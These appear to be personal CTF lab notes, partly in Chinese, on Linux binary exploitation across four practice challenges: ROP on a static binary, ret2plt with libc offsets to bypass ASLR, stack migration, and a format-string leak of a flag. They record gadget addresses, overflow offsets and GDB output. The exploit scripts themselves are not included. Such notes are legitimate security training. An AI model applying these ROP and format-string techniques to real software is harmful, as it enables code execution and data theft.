# Linux Binary Exploitation - ROP/FMT

## Lab 1, [practice] simplerop_revenge

- 最基本的rop, static linking

```
# Trying
ROPgadget --binary simplerop_revenge-a94df6520a6dbe478b5a03fd31e0b0614bcdf08d
ROPgadget --binary simplerop_revenge-a94df6520a6dbe478b5a03fd31e0b0614bcdf08d | less

# GDB
pattc 300
patto <...>
found at offset: 40

# 找rop gadget
cat simplerop_revenge.rop | grep "mov qword ptr \[.*\],"
cat simplerop_revenge.rop | grep "mov qword ptr \[rdi\],"
0x000000000047a502 : mov qword ptr [rdi], rsi ; ret

cat simplerop_revenge.rop | grep "pop rdi"
0x0000000000401456 : pop rdi ; ret

cat simplerop_revenge.rop | grep "pop rsi"
0x0000000000401577 : pop rsi ; ret

# 找到data段的位址 當buffer用
gdb-peda$ readelf
.data = 0x6c9a20

# syscall參數
cat simplerop_revenge.rop | grep "pop rax"
0x0000000000478516 : pop rax ; pop rdx ; pop rbx ; ret

cat simplerop_revenge.rop | grep "syscall"
0x00000000004671b5 : syscall ; ret

# 寫完程式後
ncat -ve ./simplerop_revenge-a94df6520a6dbe478b5a03fd31e0b0614bcdf08d -kl 8888
```

## Lab 2, [practice] ret2plt

- rop, 但是dynamic linking, bypass ASLR
- 需先會return to libc

```
pattc 100
gdb-peda$ patto AA0AAFAAbAA1AA
AA0AAFAAbAA1AA found at offset: 40

ROPgadget --binary ret2plt-012ef76e3de41b4d6859a9379107ffab89b21ae3 | grep "pop rdi"
0x00000000004006f3 : pop rdi ; ret

export LD_PRELOAD=./libc.so.6

# 得到put.got=0x601018, put.plt=0x4004e0, gets.plt=0x400510
gdb-peda$ elfsymbol
Found 5 symbols
puts@plt = 0x4004e0
printf@plt = 0x4004f0
__libc_start_main@plt = 0x400500
gets@plt = 0x400510
setvbuf@plt = 0x400520
gdb-peda$ disassemble 0x4004e0
Dump of assembler code for function puts@plt:
    0x00000000004004e0 <+0>:     jmp    QWORD PTR [rip+0x200b32]        # 0x601018
    0x00000000004004e6 <+6>:     push   0x0
    0x00000000004004eb <+11>:    jmp    0x4004d0
End of assembler dump.

# puts的offset為 000000000006f690
objdump -T libc.so.6 | grep puts
# system offset 0000000000045390
objdump -T libc.so.6 | grep system
```

## Lab 3, [practice] migr4ti0n

- rop, 但buffer不夠長, 所以要stack migration

```
# 56
gdb-peda$ patto AcAA2AAHAAd
AcAA2AAHAAd found at offset: 56

# 題目中用的read只有128 bytes 不夠塞rop chains，做stack migration

ROPgadget --binary migr4ti0n-5b1ebb81d74911197f610391688c934210d79274 | grep "pop rdi"
0x00000000004006b3 : pop rdi ; ret
ROPgadget --binary migr4ti0n-5b1ebb81d74911197f610391688c934210d79274 | grep "pop rdx"
0x00000000004006d4 : pop rdx ; ret
ROPgadget --binary migr4ti0n-5b1ebb81d74911197f610391688c934210d79274 | grep "pop rsi"
0x00000000004006b1 : pop rsi ; pop r15 ; ret
ROPgadget --binary migr4ti0n-5b1ebb81d74911197f610391688c934210d79274 | grep "leave"
0x000000000040064a : leave ; ret

# export LD_PRELOAD=./libc.so.6
# 無法elfsymbol因為：
# question: 請問migr4ti0n那題也有人elfsymbol會跑出'plt' symbol : no match found的嗎？
# scwuaptx: @question 之前沒看到你的問題 抱歉 這主要是因為 ubuntu 16.04 之後 compile 把 dynamic symbol 拔掉導致他找不到 plt ，我的 peda 是改過去硬找的，上次忘記說ＱＱ，基本上你可以 objdump 去找 .plt.got 那個 section 看到 jmp xxx ; xchg ax,ax 那邊就分別對應到一個 function 他的順序跟 got 一樣 ，可以用這方式一一對回來

# 只好objdump找plt
objdump -d -M intel migr4ti0n-5b1ebb81d74911197f610391688c934210d79274 > migr4ti0n.dump
read@plt = 4004e0
puts@plt = 4004d8
# 硬抓got, puts@got = 0x600fd8
gdb-peda$ x/i 0x4004d8
   0x4004d8:    jmp    QWORD PTR [rip+0x200afa]        # 0x600fd8
# puts offset = 0x6f690
objdump -T libc.so.6 | grep puts
000000000006f690  w   DF .text  00000000000001c8  GLIBC_2.2.5 puts
# system offset = 0x45390
objdump -T libc.so.6 | grep system
0000000000045390  w   DF .text  000000000000002d  GLIBC_2.2.5 system

# 找buffer從 .bss段跟.data段, 0x00602000扣一點做buf
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/hsu/ctf-adl/ntu/10-13/migr4ti0n/migr4ti0n-5b1ebb81d74911197f610391688c934210d79274
0x00600000         0x00601000         r--p      /home/hsu/ctf-adl/ntu/10-13/migr4ti0n/migr4ti0n-5b1ebb81d74911197f610391688c934210d79274
0x00601000         0x00602000         rw-p      /home/hsu/ctf-adl/ntu/10-13/migr4ti0n/migr4ti0n-5b1ebb81d74911197f610391688c934210d79274

# 寫程式
```

## Lab 4, [practice] format

## Lab 5,

```
# 假資料
sudo mkdir /home/cr4ck ; sudo vim /home/cr4ck/flag

# 先斷在有問題的format string
0x0000000000400712 <+171>:   call   0x400520 <printf@plt>
gdb-peda$ b *0x0000000000400712

# 先輸入 %p 觀察
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc70 --> 0xa7025 ('%p\n')
# 64bits第七個參數開始是用stack傳遞，前面參數是用register

# 重run 輸入 %7$pAAAABBBBBBBB，8 bytes一組
ni
# 印出的內容：0x4242424242424242AAAABBBBBBBB
# 的確會印出：0x4242424242424242(BBBBBBBB)

# 定位出flag位址
gdb-peda$ x/x &flag
0x600ba0 <flag>:        0x0000000a47414c46

# 寫程式囉，送出%7$sAAAA<flag> 就會印出flag位址中的字串

# 用完刪掉
sudo rm -rf /home/cr4ck/
```
